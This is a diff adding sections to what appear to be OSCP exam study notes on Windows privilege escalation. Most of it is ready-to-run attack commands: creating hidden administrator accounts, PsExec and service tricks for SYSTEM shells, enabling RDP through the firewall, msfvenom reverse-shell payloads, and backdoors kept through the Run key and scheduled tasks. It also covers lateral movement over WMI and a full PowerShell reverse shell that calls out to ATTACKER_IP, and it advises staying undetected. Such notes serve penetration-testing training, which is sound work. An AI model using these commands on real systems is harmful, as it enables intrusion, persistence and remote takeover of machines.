@@ -1,3 +1,169 @@
+# Spawning Administrator/SYSTEM Shells in Windows
+
+This document covers techniques for spawning administrator and SYSTEM-level shells after gaining initial access to a Windows system.
+
+## Elevating Regular User to Administrator
+
+### Adding User to Administrators Group
+
+If you have administrator credentials or compromised an admin-level account, you can add a regular user to the administrators group:
+
+```cmd
+net localgroup administrators <username> /add
+```
+
+After this, you can use that user account to open an elevated command prompt or access privileged resources.
+
+### Using RunAs to Execute Commands as Administrator
+
+If you have administrator credentials but are logged in as a regular user:
+
+```cmd
+runas /user:Administrator cmd.exe
+```
+
+### Creating a New Administrator User
+
+```cmd
+net user hackerman Password123 /add
+net localgroup administrators hackerman /add
+```
+
+## Escalating from Administrator to SYSTEM
+
+### Using PSExec
+
+PSExec is a powerful tool from Microsoft's Sysinternals suite that allows you to execute processes on remote systems with SYSTEM privileges.
+
+#### PSExec Local Usage for SYSTEM Shell
+
+```cmd
+# Download from Microsoft's website
+# https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+
+# Execute cmd.exe as SYSTEM
+PsExec64.exe -i -s cmd.exe
+
+# Execute PowerShell as SYSTEM
+PsExec64.exe -i -s powershell.exe
+```
+
+#### PSExec Remote Usage
+
+```cmd
+# Access remote system (requires admin credentials)
+PsExec64.exe \\remote_host -u Domain\Administrator -p Password cmd.exe
+
+# Execute with SYSTEM privileges on remote system
+PsExec64.exe \\remote_host -u Domain\Administrator -p Password -s cmd.exe
+```
+
+### Using Service Creation for SYSTEM Shell
+
+Creating and starting a service that executes a command will run that command as SYSTEM:
+
+```cmd
+# Create a service that launches cmd.exe
+sc create mysvc binpath= "cmd.exe /k start"
+sc start mysvc
+```
+
+## Remote Access with GUI
+
+### RDP Access After Privilege Escalation
+
+After adding a user to the administrators group, you can use RDP to connect with a GUI interface:
+
+```cmd
+# Enable RDP if it's disabled
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Add firewall exception for RDP
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+# Connect using RDP client from Kali
+xfreerdp /v:<target-ip> /u:<username> /p:<password> /dynamic-resolution
+```
+
+## Payload Generation with MSFvenom
+
+MSFvenom can create payloads that establish privileged shells when executed on the target.
+
+### Generating Reverse Shell Payloads
+
+```bash
+# Windows reverse shell executable (stageless)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o reverse_shell.exe
+
+# Windows reverse shell executable (staged, better for AV evasion)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o reverse_met.exe
+
+# PowerShell payload
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f psh -o reverse_shell.ps1
+```
+
+### Getting the Payload to Execute with High Privileges
+
+1. **Scheduled Task Method**:
+   ```cmd
+   # Create task that runs as SYSTEM
+   schtasks /create /tn "SystemTask" /tr "c:\path\to\reverse_shell.exe" /sc once /st 23:59 /ru "SYSTEM"
+   schtasks /run /tn "SystemTask"
+   ```
+
+2. **Service Method**:
+   ```cmd
+   # Create service pointing to your payload
+   sc create ReverseSvc binpath= "c:\path\to\reverse_shell.exe" start= auto
+   sc start ReverseSvc
+   ```
+
+## Maintaining Access
+
+### Creating Persistent Administrator Backdoors
+
+```cmd
+# Scheduled task persistence
+schtasks /create /tn "Backdoor" /tr "c:\path\to\backdoor.exe" /sc onlogon /ru "SYSTEM"
+
+# Registry persistence (Run key)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "c:\path\to\backdoor.exe"
+```
+
+## Lateral Movement with Administrator/SYSTEM Shells
+
+### WMI for Remote Execution
+
+```cmd
+# Execute command on remote system
+wmic /node:"remote-host" /user:"domain\admin" /password:"password" process call create "cmd.exe /c payload.exe"
+```
+
+### PowerShell Remoting
+
+```powershell
+# Enable PS Remoting if needed
+Enable-PSRemoting -Force
+
+# Connect to remote system
+Enter-PSSession -ComputerName remote-host -Credential domain\admin
+
+# Execute commands with Invoke-Command
+Invoke-Command -ComputerName remote-host -Credential domain\admin -ScriptBlock {whoami}
+```
+
+## OSCP Exam Notes
+
+For the OSCP exam, focus on:
+
+1. Adding users to the administrators group when you have admin access
+2. Using PSExec to get SYSTEM shells from administrator accounts
+3. Setting up RDP access for easier post-exploitation
+4. Simple MSFvenom payloads for getting reverse shells
+5. Using built-in Windows commands rather than external tools when possible
+
+Remember that PSExec and other admin-level activities will likely trigger antivirus or EDR solutions in real environments. For the OSCP, focus on using these techniques in ways that minimize detection.
+
 # Windows Service Exploitation
 
 Windows services often run with high privileges and can be exploited in various ways for privilege escalation. This document covers common techniques to identify and exploit vulnerable services.
@@ -274,6 +440,94 @@ If you can change the service configuration but cannot start or stop it:
    ```
 
 3. **Option 3**: Look for services that are frequently restarted by the system or users
+
+## Using RunAs to Execute Commands as Another User
+
+The `runas` command allows you to run programs as another user, which can be useful for privilege escalation when you have credentials for a higher-privileged account.
+
+### Basic RunAs Usage
+
+```cmd
+# Basic syntax
+runas /user:DOMAIN\username "command"
+
+# Execute command prompt as Administrator
+runas /user:Administrator cmd.exe
+
+# Specify a domain
+runas /user:DOMAIN\Administrator cmd.exe
+
+# Open a program with a specific user
+runas /user:Administrator "notepad.exe C:\Windows\System32\drivers\etc\hosts"
+```
+
+### Using Saved Credentials
+
+By default, `runas` doesn't accept pre-supplied passwords. However, you can use the `/savecred` option if the user has previously saved credentials:
+
+```cmd
+# Use saved credentials (if available)
+runas /savecred /user:Administrator cmd.exe
+```
+
+> Note: The `/savecred` option only works if the user has previously saved credentials using the same command with valid credentials.
+
+### RunAs with PowerShell and Supplied Password
+
+Since `runas` doesn't allow direct password input, you can use PowerShell to achieve this:
+
+```powershell
+# Create a credential object
+$username = "Administrator"
+$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($username, $password)
+
+# Start a process with these credentials
+Start-Process -FilePath "cmd.exe" -Credential $cred
+```
+
+### Starting a Service with Alternative Credentials
+
+```cmd
+# Start a service as a different user
+sc.exe config SERVICE_NAME obj= "DOMAIN\username" password= "Password123!"
+sc.exe start SERVICE_NAME
+```
+
+### Exploiting RunAs for Privilege Escalation
+
+1. **When you have discovered credentials** (from credential hunting):
+   ```cmd
+   runas /user:Administrator "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
+   ```
+
+2. **Establishing a reverse shell as the privileged user**:
+   ```powershell
+   # Create PowerShell reverse shell script (save as rev.ps1)
+   $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444);
+   $stream = $client.GetStream();
+   [byte[]]$bytes = 0..65535|%{0};
+   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+       $sendback = (Invoke-Expression $data 2>&1 | Out-String);
+       $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+       $stream.Write($sendbyte,0,$sendbyte.Length);
+       $stream.Flush()
+   };
+   $client.Close();
+   
+   # Execute as the privileged user
+   runas /user:Administrator "powershell.exe -ExecutionPolicy Bypass -File C:\path\to\rev.ps1"
+   ```
+
+### Limitations of RunAs
+
+- Requires knowing the user's password
+- By default, doesn't accept pre-supplied passwords
+- Creates a new logon session (doesn't inherit current session's network shares or mapped drives)
+- May require desktop interaction depending on system settings
+- May trigger User Account Control (UAC) prompts
 
 ## Real-World Example 1: Exploiting Unquoted Service Path
 
